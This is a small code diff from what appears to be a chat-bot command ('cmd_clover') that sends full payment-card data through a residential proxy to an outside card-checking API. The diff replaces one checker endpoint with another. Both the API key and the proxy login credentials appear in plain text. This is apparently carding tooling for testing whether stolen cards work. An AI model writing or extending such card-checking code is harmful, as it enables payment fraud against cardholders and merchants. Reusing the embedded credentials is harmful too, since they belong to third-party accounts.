@@ -70,7 +70,7 @@ async def cmd_clover(client, message):
         try:
             async with httpx.AsyncClient(timeout=50) as clientx:
                 proxy_string = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
-                url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy_string}"
+                url = f"https://barryxapi.xyz/clover?key=BRY-HEIQ7-KPWYR-DRU67&card={fullcc}&proxy={proxy_string}"
                 res = await clientx.get(url)
                 try:
                     data = res.json()
